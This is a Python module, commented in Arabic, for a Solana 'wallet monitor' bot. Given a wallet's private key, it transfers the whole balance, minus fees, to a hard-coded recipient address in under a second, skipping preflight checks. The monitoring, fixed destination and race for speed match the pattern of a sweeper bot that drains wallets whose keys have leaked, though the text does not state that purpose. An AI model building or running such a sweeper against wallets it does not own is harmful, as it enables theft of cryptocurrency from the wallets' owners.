"""
Auto Transfer Module for Solana Wallet Monitor Bot
Contains all auto-transfer related functionality
"""

import os
import logging
import asyncio
import json
import base58
from datetime import datetime
import aiohttp

# Make TRANSFER_RPC_URL accessible to main.py
TRANSFER_RPC_URL = (
    os.getenv("TRANSFER_RPC_URL") or os.getenv("RPC_URL")
)  # Use TRANSFER_RPC_URL as fallback

logger = logging.getLogger(__name__)

# Auto-transfer configuration
MIN_AUTO_TRANSFER_AMOUNT = 0.0002  # SOL - الحد الأدنى للتحويل التلقائي
RECIPIENT_ADDRESS = (
    "FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG"  # عنوان المستلم الافتراضي
)
# تحسينات التحويل السريع مع RPC المخصص
FAST_TRANSFER_CONFIG = {
    "max_requests_per_second": 25,  # السعة القصوى لـ TRANSFER_RPC_URL
    "timeout": 5,  # timeout أقصر للاستجابة السريعة
    "max_retries": 2,  # محاولات أقل للسرعة
    "commitment": "confirmed",  # commitment أسرع من finalized
    "skip_preflight": False,  # للأمان مع الحفاظ على السرعة
    "preflight_commitment": "processed",  # أسرع preflight
}

def format_sol_amount(lamports: int) -> str:
    """Convert lamports to SOL"""
    sol = lamports / 1_000_000_000  # 1 SOL = 1 billion lamports
    return f"{sol:.9f}"

def format_timestamp(timestamp: int) -> str:
    """Format Unix timestamp to readable string"""
    if not timestamp:
        return "غير محدد"
    dt = datetime.fromtimestamp(timestamp)
    return dt.strftime("%Y-%m-%d %H:%M:%S")

def truncate_address(address: str, length: int = 8) -> str:
    """Truncate wallet address for display"""
    if len(address) <= length * 2:
        return address
    return f"{address[:length]}...{address[-length:]}"

class AutoTransfer:
    def __init__(self, session: aiohttp.ClientSession = None, make_rpc_call=None, get_wallet_balance=None, get_blockchain_time=None):
        self.session = session
        self.make_rpc_call = make_rpc_call
        self.get_wallet_balance = get_wallet_balance
        self.get_blockchain_time = get_blockchain_time

        # تسجيل تفصيلي للتحويلات
        self.detailed_logger = logging.getLogger("detailed_transfers")

    def set_min_auto_transfer_amount(self, amount: float):
        """Set minimum auto-transfer amount"""
        global MIN_AUTO_TRANSFER_AMOUNT
        MIN_AUTO_TRANSFER_AMOUNT = amount

    def get_min_auto_transfer_amount(self) -> float:
        """Get minimum auto-transfer amount"""
        return MIN_AUTO_TRANSFER_AMOUNT

    def set_recipient_address(self, address: str):
        """Set recipient address for auto-transfers"""
        global RECIPIENT_ADDRESS
        RECIPIENT_ADDRESS = address

    def get_recipient_address(self) -> str:
        """Get current recipient address"""
        return RECIPIENT_ADDRESS

    async def get_optimal_priority_fee(self) -> int:
        """Get optimal priority fee ensuring total fees don't exceed 0.000055 SOL"""
        try:
            # رسوم الشبكة الأساسية الثابتة
            BASE_NETWORK_FEE_SOL = 0.000005  # رسوم الشبكة الأساسية

            # الحد الأقصى المسموح به للرسوم الكاملة
            MAX_TOTAL_FEES_SOL = 0.000055

            # الحد الأدنى لرسوم الأولوية (لضمان سرعة معقولة)
            MIN_PRIORITY_FEE_SOL = 0.000010

            # احسب الحد الأقصى المتاح لرسوم الأولوية
            MAX_PRIORITY_FEE_SOL = (
                MAX_TOTAL_FEES_SOL - BASE_NETWORK_FEE_SOL
            )  # 0.000050 SOL

            COMPUTE_UNITS = 200000
            MAX_PRIORITY_FEE_MICRO_LAMPORTS = int(
                (MAX_PRIORITY_FEE_SOL * 1_000_000_000) / COMPUTE_UNITS * 1_000_000
            )
            MIN_PRIORITY_FEE_MICRO_LAMPORTS = int(
                (MIN_PRIORITY_FEE_SOL * 1_000_000_000) / COMPUTE_UNITS * 1_000_000
            )

            # احصل على معلومات الرسوم الحالية من الشبكة
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getRecentPrioritizationFees",
                "params": [[RECIPIENT_ADDRESS]],
            }

            data = await self.make_rpc_call(payload)
            if data and "result" in data and data["result"]:
                fees = data["result"]
                if fees:
                    # احسب متوسط الرسوم الأخيرة
                    recent_fees = [fee["prioritizationFee"] for fee in fees[-10:]]
                    if recent_fees:
                        avg_fee = sum(recent_fees) / len(recent_fees)
                        # أضف هامش أمان 20% (مخفض أكثر لضمان عدم تجاوز الحد)
                        optimal_fee = int(avg_fee * 1.2)
                        # تطبيق الحد الأدنى والأقصى الصارم
                        optimal_fee = max(
                            MIN_PRIORITY_FEE_MICRO_LAMPORTS,
                            min(optimal_fee, MAX_PRIORITY_FEE_MICRO_LAMPORTS),
                        )

                        # حساب التكلفة الفعلية لرسوم الأولوية
                        priority_cost_sol = (optimal_fee * COMPUTE_UNITS) / (
                            1_000_000 * 1_000_000_000
                        )
                        total_cost_sol = BASE_NETWORK_FEE_SOL + priority_cost_sol

                        logger.info(
                            f"💰 Priority fee: {optimal_fee} μλ/CU (≈{priority_cost_sol:.9f} SOL)"
                        )
                        logger.info(
                            f"💰 Total fees: {total_cost_sol:.9f} SOL (Base: {BASE_NETWORK_FEE_SOL:.9f} + Priority: {priority_cost_sol:.9f})"
                        )
                        logger.info(
                            f"📊 Within limit: {total_cost_sol <= MAX_TOTAL_FEES_SOL} (Max: {MAX_TOTAL_FEES_SOL:.9f} SOL)"
                        )

                        return optimal_fee

            # القيمة الافتراضية مع ضمان عدم تجاوز الحد الكامل
            default_fee = max(
                MIN_PRIORITY_FEE_MICRO_LAMPORTS,
                min(8000, MAX_PRIORITY_FEE_MICRO_LAMPORTS),
            )
            default_priority_cost = (default_fee * COMPUTE_UNITS) / (
                1_000_000 * 1_000_000_000
            )
            default_total_cost = BASE_NETWORK_FEE_SOL + default_priority_cost

            logger.info(f"💰 Default priority fee: {default_fee} μλ/CU")
            logger.info(
                f"💰 Default total fees: {default_total_cost:.9f} SOL (Base: {BASE_NETWORK_FEE_SOL:.9f} + Priority: {default_priority_cost:.9f})"
            )

            return default_fee

        except Exception as e:
            # رسوم طوارئ منخفضة جداً لضمان عدم تجاوز الحد
            BASE_NETWORK_FEE_SOL = 0.000005
            MAX_TOTAL_FEES_SOL = 0.000055
            MAX_PRIORITY_FEE_SOL = MAX_TOTAL_FEES_SOL - BASE_NETWORK_FEE_SOL
            COMPUTE_UNITS = 200000

            emergency_fee = int(
                (MAX_PRIORITY_FEE_SOL * 0.5 * 1_000_000_000) / COMPUTE_UNITS * 1_000_000
            )  # 50% من الحد الأقصى
            emergency_priority_cost = (emergency_fee * COMPUTE_UNITS) / (
                1_000_000 * 1_000_000_000
            )
            emergency_total_cost = BASE_NETWORK_FEE_SOL + emergency_priority_cost

            logger.warning(f"⚠️ Error getting priority fee, using emergency fee")
            logger.warning(
                f"💰 Emergency total fees: {emergency_total_cost:.9f} SOL (Base: {BASE_NETWORK_FEE_SOL:.9f} + Priority: {emergency_priority_cost:.9f})"
            )

            return emergency_fee

    async def check_signature_status_fast(self, signature: str) -> dict:
        """Ultra-fast signature status check using dedicated RPC"""
        try:
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getSignatureStatuses",
                "params": [[signature], {"searchTransactionHistory": True}],
            }

            # استخدام RPC المخصص مع timeout سريع
            timeout = FAST_TRANSFER_CONFIG["timeout"]
            async with self.session.post(
                TRANSFER_RPC_URL, json=payload, timeout=timeout
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    if data and "result" in data and "value" in data["result"]:
                        result = data["result"]["value"][0]
                        if result is not None:
                            return {
                                "confirmed": True,
                                "status": result,
                                "slot": result.get("slot"),
                                "confirmations": result.get("confirmations"),
                                "err": result.get("err"),
                            }

            return {"confirmed": False, "status": None}

        except Exception as e:
            logger.debug(f"Fast signature status check error: {e}")
            return {"confirmed": False, "status": None}

    async def auto_transfer_funds_fast(
        self,
        from_wallet: str,
        private_key: str,
        to_wallet: str,
        use_priority_fee: bool = True,
    ) -> tuple[bool, str]:
        """ULTRA-FAST auto-transfer optimized for sub-1-second completion"""
        transfer_id = f"lightning_transfer_{from_wallet[:8]}_{int(asyncio.get_event_loop().time())}"

        # مُسجل الأوقات التفصيلي لاكتشاف سبب التأخير
        timing_diagnostics = {
            "function_start": asyncio.get_event_loop().time(),
            "steps": [],
            "delays_detected": []
        }

        def log_timing_step(step_name: str, description: str = ""):
            """تسجيل وقت كل خطوة بدقة"""
            current_time = asyncio.get_event_loop().time()
            step_info = {
                "step": step_name,
                "timestamp": current_time,
                "elapsed_total": current_time - timing_diagnostics["function_start"],
                "description": description
            }
            
            # حساب الوقت منذ الخطوة السابقة
            if timing_diagnostics["steps"]:
                step_info["step_duration"] = current_time - timing_diagnostics["steps"][-1]["timestamp"]
                
                # اكتشاف التأخيرات المشبوهة (أكثر من 100ms بين الخطوات)
                if step_info["step_duration"] > 0.1:
                    delay_info = {
                        "between_steps": f"{timing_diagnostics['steps'][-1]['step']} -> {step_name}",
                        "delay_duration": step_info["step_duration"],
                        "description": f"Unexpected delay: {step_info['step_duration']:.3f}s"
                    }
                    timing_diagnostics["delays_detected"].append(delay_info)
                    logger.warning(f"⚠️ [{transfer_id}] DELAY DETECTED: {delay_info['between_steps']} took {delay_info['delay_duration']:.3f}s")
            
            timing_diagnostics["steps"].append(step_info)
            logger.info(f"⏱️ [{transfer_id}] {step_name}: {step_info['elapsed_total']:.3f}s total | {description}")

        try:
            import base58
            from solders.keypair import Keypair
            from solders.pubkey import Pubkey
            from solders.system_program import TransferParams, transfer
            from solders.transaction import Transaction
            from solders.message import Message
            from solders.compute_budget import (
                set_compute_unit_price,
                set_compute_unit_limit,
            )
            import json

            log_timing_step("FUNCTION_START", "Starting ULTRA-FAST auto-transfer (target: <1s)")
            logger.info(f"⚡ [{transfer_id}] Starting ULTRA-FAST auto-transfer (target: <1s)")

            # Step 1: Single ultra-fast balance check (no retries)
            log_timing_step("BALANCE_CHECK_START", "Starting balance verification")
            
            balance_start_time = asyncio.get_event_loop().time()
            current_balance = await self.get_wallet_balance(from_wallet)
            balance_check_duration = asyncio.get_event_loop().time() - balance_start_time
            
            log_timing_step("BALANCE_CHECK_COMPLETE", f"Balance: {current_balance:.9f} SOL, took {balance_check_duration:.3f}s")
            
            if balance_check_duration > 0.5:
                logger.warning(f"🐌 [{transfer_id}] SLOW BALANCE CHECK: {balance_check_duration:.3f}s - this may be causing delays!")
            
            if current_balance <= 0:
                log_timing_step("BALANCE_CHECK_FAILED", "Zero balance detected, aborting")
                return False, None

            # Step 2: Calculate transfer amount with priority fee within total limit
            log_timing_step("FEE_CALCULATION_START", "Starting fee calculations")
            
            BASE_TRANSFER_FEE = 0.000005
            priority_fee_sol = 0
            priority_fee_micro_lamports = 0

            if use_priority_fee:
                # استخدام رسوم أولوية ثابتة سريعة (بدون استعلام من الشبكة)
                priority_fee_micro_lamports = 35000  # رسوم أولوية عالية جداً (0.000035 SOL)
                compute_units = 200000
                priority_fee_lamports = (
                    priority_fee_micro_lamports * compute_units
                ) / 1_000_000
                priority_fee_sol = priority_fee_lamports / 1_000_000_000

                log_timing_step("PRIORITY_FEE_CALCULATED", f"Priority fee: {priority_fee_sol:.9f} SOL")
                logger.info(
                    f"⚡ [{transfer_id}] Fast priority fee: {priority_fee_sol:.9f} SOL ({priority_fee_micro_lamports} μλ/CU)"
                )

            TOTAL_TRANSFER_FEE = BASE_TRANSFER_FEE + priority_fee_sol

            # التأكد من عدم تجاوز الحد الأقصى للرسوم الكاملة
            MAX_TOTAL_FEES = 0.000055
            if TOTAL_TRANSFER_FEE > MAX_TOTAL_FEES:
                # إذا تجاوز الحد، قلل من رسوم الأولوية
                priority_fee_sol = MAX_TOTAL_FEES - BASE_TRANSFER_FEE
                priority_fee_micro_lamports = int(
                    (priority_fee_sol * 1_000_000_000 / compute_units) * 1_000_000
                )
                TOTAL_TRANSFER_FEE = MAX_TOTAL_FEES
                logger.warning(
                    f"⚠️ [{transfer_id}] Adjusted to max limit: Total {TOTAL_TRANSFER_FEE:.9f} SOL (Priority reduced to {priority_fee_sol:.9f})"
                )

            logger.info(
                f"💰 [{transfer_id}] Total transfer fees: {TOTAL_TRANSFER_FEE:.9f} SOL (Base: {BASE_TRANSFER_FEE:.9f} + Priority: {priority_fee_sol:.9f})"
            )

            if current_balance <= TOTAL_TRANSFER_FEE:
                return False, None

            amount_to_send = current_balance - TOTAL_TRANSFER_FEE
            transfer_lamports = int(amount_to_send * 1_000_000_000)

            if transfer_lamports <= 0:
                return False, None

            # Step 3: Create keypair (optimized)
            log_timing_step("KEYPAIR_CREATION_START", "Creating keypair and destination pubkey")
            
            try:
                keypair_start = asyncio.get_event_loop().time()
                if private_key.startswith("[") and private_key.endswith("]"):
                    key_array = json.loads(private_key)
                    keypair = Keypair.from_bytes(bytes(key_array))
                else:
                    private_key_bytes = base58.b58decode(private_key)
                    keypair = Keypair.from_bytes(private_key_bytes)

                destination_pubkey = Pubkey.from_string(to_wallet)
                keypair_duration = asyncio.get_event_loop().time() - keypair_start
                
                log_timing_step("KEYPAIR_CREATION_COMPLETE", f"Keypair created in {keypair_duration:.3f}s")
                
                if keypair_duration > 0.1:
                    logger.warning(f"🔑 [{transfer_id}] SLOW KEYPAIR CREATION: {keypair_duration:.3f}s")
                    
            except Exception as e:
                log_timing_step("KEYPAIR_CREATION_FAILED", f"Keypair creation failed: {e}")
                return False, None

            # Step 4: Single-attempt fast transfer with minimal verification
            try:
                # Get fresh blockhash with fastest commitment
                log_timing_step("BLOCKHASH_REQUEST_START", "Requesting latest blockhash")
                
                blockhash_start = asyncio.get_event_loop().time()
                blockhash_payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getLatestBlockhash",
                    "params": [{"commitment": "processed"}],  # أسرع commitment
                }

                blockhash_response = await self.make_rpc_call(
                    blockhash_payload, max_retries=1
                )
                blockhash_duration = asyncio.get_event_loop().time() - blockhash_start
                
                if not blockhash_response or "result" not in blockhash_response:
                    log_timing_step("BLOCKHASH_REQUEST_FAILED", f"Blockhash request failed after {blockhash_duration:.3f}s")
                    return False, None

                recent_blockhash = blockhash_response["result"]["value"]["blockhash"]
                log_timing_step("BLOCKHASH_REQUEST_COMPLETE", f"Blockhash received in {blockhash_duration:.3f}s")
                
                if blockhash_duration > 1.0:
                    logger.warning(f"🐌 [{transfer_id}] SLOW BLOCKHASH REQUEST: {blockhash_duration:.3f}s - major delay source!")
                elif blockhash_duration > 0.5:
                    logger.warning(f"⚠️ [{transfer_id}] MODERATE BLOCKHASH DELAY: {blockhash_duration:.3f}s")

                # Create transaction instructions
                log_timing_step("TRANSACTION_BUILD_START", "Building transaction instructions")
                
                tx_build_start = asyncio.get_event_loop().time()
                instructions = []

                if use_priority_fee:
                    instructions.append(set_compute_unit_limit(200000))
                    instructions.append(
                        set_compute_unit_price(priority_fee_micro_lamports)
                    )

                instructions.append(
                    transfer(
                        TransferParams(
                            from_pubkey=keypair.pubkey(),
                            to_pubkey=destination_pubkey,
                            lamports=transfer_lamports,
                        )
                    )
                )

                from solders.hash import Hash

                recent_blockhash_hash = Hash.from_string(recent_blockhash)

                message = Message.new_with_blockhash(
                    instructions, keypair.pubkey(), recent_blockhash_hash
                )

                transaction = Transaction([keypair], message, recent_blockhash_hash)

                # Serialize and send with fastest settings
                import base64

                serialized_tx = base64.b64encode(bytes(transaction)).decode("utf-8")
                tx_build_duration = asyncio.get_event_loop().time() - tx_build_start
                
                log_timing_step("TRANSACTION_BUILD_COMPLETE", f"Transaction built in {tx_build_duration:.3f}s")
                
                if tx_build_duration > 0.2:
                    logger.warning(f"🏗️ [{transfer_id}] SLOW TRANSACTION BUILD: {tx_build_duration:.3f}s")

                send_payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "sendTransaction",
                    "params": [
                        serialized_tx,
                        {
                            "encoding": "base64",
                            "maxRetries": 0,
                            "skipPreflight": True,  # تخطي التحقق المسبق للسرعة
                            "preflightCommitment": "processed",
                        },
                    ],
                }

                log_timing_step("TRANSACTION_SEND_START", "Sending transaction to network")
                send_start = asyncio.get_event_loop().time()

                # إرسال فوري مع RPC مخصص
                try:
                    async with self.session.post(
                        TRANSFER_RPC_URL, json=send_payload, timeout=2
                    ) as response:
                        if response.status == 200:
                            send_response = await response.json()
                        else:
                            send_response = None
                except Exception:
                    send_response = await self.make_rpc_call(
                        send_payload, max_retries=1
                    )

                if not send_response or "result" not in send_response:
                    return False, None

                tx_signature = send_response["result"]
                logger.info(f"⚡ [{transfer_id}] Sent! Sig: {tx_signature[:16]}...")

                # تحقق فائق السرعة من التوقيع (تقليل إلى النصف)
                for check_attempt in range(2):  # محاولتان فقط = 0.3 ثانية
                    await asyncio.sleep(0.15)  # تقليل إلى 150ms

                    status_result = await self.check_signature_status_fast(tx_signature)
                    if status_result["confirmed"]:
                        if status_result["status"].get("err") is None:
                            total_time = asyncio.get_event_loop().time() - send_start
                            logger.info(
                                f"⚡ [{transfer_id}] CONFIRMED in {total_time:.2f}s!"
                            )
                            return True, tx_signature
                        else:
                            logger.error(f"❌ [{transfer_id}] Transaction failed")
                            return False, None

                # إرجاع تفاؤلي فوري - المعاملة ستكتمل لاحقاً
                total_time = asyncio.get_event_loop().time() - send_start
                log_timing_step("FUNCTION_END", f"Function completed - transaction sent")
                
                # تحليل شامل للتأخيرات
                function_total_time = asyncio.get_event_loop().time() - timing_diagnostics["function_start"]
                
                logger.info(f"⚡ [{transfer_id}] INSTANT return after {total_time:.2f}s (transaction will confirm shortly)")
                logger.info(f"📊 [{transfer_id}] TOTAL FUNCTION TIME: {function_total_time:.3f}s")
                
                # تقرير التأخيرات المكتشفة
                if timing_diagnostics["delays_detected"]:
                    logger.warning(f"🚨 [{transfer_id}] DELAYS DETECTED ({len(timing_diagnostics['delays_detected'])}):")
                    total_delay_time = 0
                    for delay in timing_diagnostics["delays_detected"]:
                        logger.warning(f"  • {delay['between_steps']}: {delay['delay_duration']:.3f}s")
                        total_delay_time += delay['delay_duration']
                    logger.warning(f"  📊 TOTAL DELAY TIME: {total_delay_time:.3f}s of {function_total_time:.3f}s ({(total_delay_time/function_total_time)*100:.1f}%)")
                
                # تحليل أوقات الخطوات الأطول
                longest_steps = sorted(
                    [step for step in timing_diagnostics["steps"] if "step_duration" in step], 
                    key=lambda x: x.get("step_duration", 0), 
                    reverse=True
                )[:3]
                
                if longest_steps:
                    logger.info(f"🔍 [{transfer_id}] LONGEST STEPS:")
                    for i, step in enumerate(longest_steps, 1):
                        logger.info(f"  {i}. {step['step']}: {step.get('step_duration', 0):.3f}s")
                
                # تقرير نهائي
                if function_total_time > 2.0:
                    logger.error(f"🚨 [{transfer_id}] FUNCTION TOO SLOW: {function_total_time:.3f}s > 2.0s target!")
                elif function_total_time > 1.0:
                    logger.warning(f"⚠️ [{transfer_id}] FUNCTION SLOW: {function_total_time:.3f}s > 1.0s target")
                else:
                    logger.info(f"✅ [{transfer_id}] FUNCTION FAST: {function_total_time:.3f}s within target")
                
                return True, tx_signature

            except Exception as e:
                logger.error(f"❌ [{transfer_id}] Fast transfer error: {e}")
                return False, None

        except Exception as e:
            logger.error(f"❌ [{transfer_id}] Critical error: {e}")
            return False, None

    